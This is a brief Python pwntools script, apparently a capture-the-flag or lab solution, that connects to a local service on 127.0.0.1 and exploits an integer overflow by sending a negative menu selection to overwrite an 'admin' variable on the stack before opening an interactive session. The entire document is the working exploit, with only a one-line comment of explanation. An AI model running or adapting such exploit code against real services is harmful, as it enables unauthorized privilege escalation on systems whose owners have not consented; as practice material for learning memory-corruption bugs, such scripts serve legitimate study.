# this is an integer overflow. write to the admin variable on the stack 
from pwn import *

p = remote('127.0.0.1',46412)
p.recvuntil('Selection (0-8): ')
p.sendline('-8')
p.recvuntil('Selection (0-8): ')
p.sendline('2')
p.recvuntil('Selection (0-8): ')
p.sendline('4')
p.recvuntil('Selection (0-8): ')
p.sendline('6')
p.interactive()